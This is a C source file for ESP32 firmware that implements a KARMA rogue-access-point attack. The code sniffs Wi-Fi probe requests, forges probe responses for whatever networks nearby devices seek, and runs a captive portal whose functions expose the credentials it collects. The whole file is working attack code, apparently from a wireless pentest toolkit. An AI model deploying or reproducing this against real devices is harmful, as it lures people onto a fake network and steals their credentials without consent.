/*
 * wifi_karma_svc.c - KARMA attack service (no UI).
 *
 * After the portal is up, starts a promiscuous monitor on the AP channel to
 * capture directed probe requests.  Each matching probe queues a unicast probe
 * response (beacon frame with subtype 0x50 and Addr1 = requester MAC).
 * The main loop drains one queued response per karma_svc_tick() call.
 *
 * Thread safety: the probe_cb runs in the WiFi task; shared state is accessed
 * with __atomic_ intrinsics, matching the pattern in wifi_karma.c.
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI
#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)

#include "wifi_karma_svc.h"
#include "wifi_common.h"

#include <string.h>
#include <stdint.h>
#include <stdbool.h>

#define KA_SVC_MAX_SSIDS  32

/* ── State ─────────────────────────────────────────────────────────────── */

static bool    s_active           = false;
static bool    s_auto_mode        = false;
static char    s_target_ssid[33]; /* specific SSID to match (non-auto mode) */
static uint8_t s_bssid[6];        /* our AP BSSID — used in probe responses */
static uint8_t s_ch;
static uint32_t s_probe_resp_count = 0;
static uint32_t s_last_poll_ms     = 0;
static uint8_t  s_hop_idx          = 0;
static uint32_t s_last_hop_ms      = 0;
#define KARMA_HOP_MS 200   /* ms per channel — interleaved with AP channel */

/* Collected probe SSIDs (auto mode — written by probe_cb, read by tick) */
static char         s_ssids[KA_SVC_MAX_SSIDS][33];
static volatile int s_ssid_count;

/* One pending probe response queued from the WiFi task via probe_cb */
static volatile bool s_probe_pending;
static uint8_t       s_probe_src[6];
static char          s_probe_ssid[33];

/* ── Probe sniffer callback (WiFi-task context) ─────────────────────────── */

static bool ssid_known(const char* ssid) {
    int n = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
    for (int i = 0; i < n; i++)
        if (strcmp(s_ssids[i], ssid) == 0) return true;
    return false;
}

static void probe_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 28) return;
    if ((frame[0] & 0xFC) != 0x40) return;    /* must be ProbeReq (0x40)  */

    uint8_t ssid_len = frame[25];
    if (ssid_len == 0 || ssid_len > 32) return;

    char ssid[33];
    memcpy(ssid, frame + 26, ssid_len);
    ssid[ssid_len] = '\0';

    /* Drop SSIDs that are all-space or all-low-ASCII control chars */
    bool printable = false;
    for (int i = 0; i < (int)ssid_len; i++)
        if ((unsigned char)ssid[i] > ' ') { printable = true; break; }
    if (!printable) return;

    /* In auto mode: collect new SSIDs as they appear */
    if (s_auto_mode && !ssid_known(ssid)) {
        int n = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
        if (n < KA_SVC_MAX_SSIDS) {
            strncpy(s_ssids[n], ssid, 32);
            s_ssids[n][32] = '\0';
            __atomic_store_n(&s_ssid_count, n + 1, __ATOMIC_RELEASE);
        }
    }

    /* Decide whether to respond */
    bool match;
    if (s_auto_mode)
        match = ssid_known(ssid);
    else
        match = (strcmp(s_target_ssid, ssid) == 0);
    if (!match) return;

    /* Queue one response at a time; tick() drains it */
    if (!__atomic_load_n(&s_probe_pending, __ATOMIC_ACQUIRE)) {
        memcpy(s_probe_src, frame + 10, 6);    /* Addr2 = requesting STA  */
        strncpy(s_probe_ssid, ssid, 32);
        s_probe_ssid[32] = '\0';
        __atomic_store_n(&s_probe_pending, true, __ATOMIC_RELEASE);
    }
}

/* ── Probe response sender (main-loop context) ─────────────────────────── */

/* Probe response = beacon with FC subtype 0x50 and Addr1 = requester MAC. */
static void send_probe_response(const uint8_t* client_mac, const char* ssid) {
    uint8_t frame[200];
    int flen = wifi_build_beacon(frame, sizeof(frame), ssid, s_bssid, s_ch);
    if (flen <= 0) return;
    frame[0] = 0x50;                    /* beacon → probe response          */
    memcpy(frame + 4, client_mac, 6);   /* Addr1 = requesting STA           */
    bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
    s_probe_resp_count++;
}

/* ── Lifecycle ─────────────────────────────────────────────────────────── */

bool karma_svc_start(const char* ssid, uint8_t ch, bool auto_mode) {
    if (s_active) karma_svc_stop();

    strncpy(s_target_ssid, ssid ? ssid : "FreeWifi", 32);
    s_target_ssid[32] = '\0';

    s_ch        = ch;
    s_auto_mode = auto_mode;

    /* Deterministic random BSSID — hash the SSID string content (not pointer) */
    wifi_prng_t prng;
    uint32_t seed = 0xCAFEBABEu ^ (uint32_t)ch;
    for (const char* p = s_target_ssid; *p; p++)
        seed = seed * 31u + (uint8_t)*p;
    wifi_prng_seed(&prng, seed);
    wifi_random_mac(&prng, s_bssid);

    __atomic_store_n(&s_ssid_count, 0, __ATOMIC_RELEASE);
    memset(s_ssids, 0, sizeof(s_ssids));

    /* Seed SSID list with the AP name; in auto mode all probed SSIDs follow */
    strncpy(s_ssids[0], s_target_ssid, 32);
    __atomic_store_n(&s_ssid_count, 1, __ATOMIC_RELEASE);

    s_probe_resp_count = 0;
    s_last_poll_ms     = 0;
    s_hop_idx          = 0;
    s_last_hop_ms      = 0;
    __atomic_store_n(&s_probe_pending, false, __ATOMIC_RELEASE);

    if (!wifi_portal_start(s_target_ssid, ch, NULL)) return false;

    /* Run promiscuous on AP channel to capture probe requests.
     * This is the APSTA+promiscuous mode the ESP32 supports natively;
     * wifi_portal_start() uses SoftAP while monitor mode captures on STA. */
    bs_wifi_monitor_start(ch, probe_cb, NULL);

    s_active = true;
    return true;
}

void karma_svc_stop(void) {
    bs_wifi_monitor_stop();
    wifi_portal_stop();
    s_active = false;
}

void karma_svc_tick(uint32_t now_ms) {
    if (!s_active) return;
    if (s_last_poll_ms == 0 || (now_ms - s_last_poll_ms) >= 10) {
        s_last_poll_ms = now_ms;
        wifi_portal_poll();
    }
    /* Drain any queued probe response */
    if (__atomic_load_n(&s_probe_pending, __ATOMIC_ACQUIRE)) {
        __atomic_store_n(&s_probe_pending, false, __ATOMIC_RELEASE);
        /* Ensure we're back on AP channel to send the probe response */
        bs_wifi_set_channel(s_ch);
        send_probe_response(s_probe_src, s_probe_ssid);
    }
    /* Channel hop: interleave AP channel with all other channels so probes on
     * any channel can be heard.  Odd slots = AP channel, even = other channel.
     * 200ms * 2 * 13 channels ≈ 5.2s for a full sweep while AP stays available
     * 50% of the time. */
    if (s_last_hop_ms == 0 || (now_ms - s_last_hop_ms) >= KARMA_HOP_MS) {
        s_last_hop_ms = now_ms;
        if (s_hop_idx & 1) {
            bs_wifi_set_channel(s_ch);           /* return to AP channel */
        } else {
            uint8_t hop = (uint8_t)((s_hop_idx / 2) % 13) + 1;
            if (hop == s_ch) hop = (uint8_t)(hop % 13) + 1;   /* skip AP ch */
            bs_wifi_set_channel(hop);
        }
        s_hop_idx++;
    }
}

/* ── Getters ────────────────────────────────────────────────────────────── */

bool karma_svc_active(void) {
    return s_active && wifi_portal_active();
}

int karma_svc_client_count(void) {
    return wifi_portal_client_count();
}

int karma_svc_cred_count(void) {
    return wifi_portal_cred_count();
}

const wifi_portal_cred_t* karma_svc_get_cred(int idx) {
    return wifi_portal_get_cred(idx);
}

int karma_svc_ssid_count(void) {
    return __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
}

uint32_t karma_svc_probe_count(void) {
    return s_probe_resp_count;
}

#endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
#endif /* BS_HAS_WIFI */
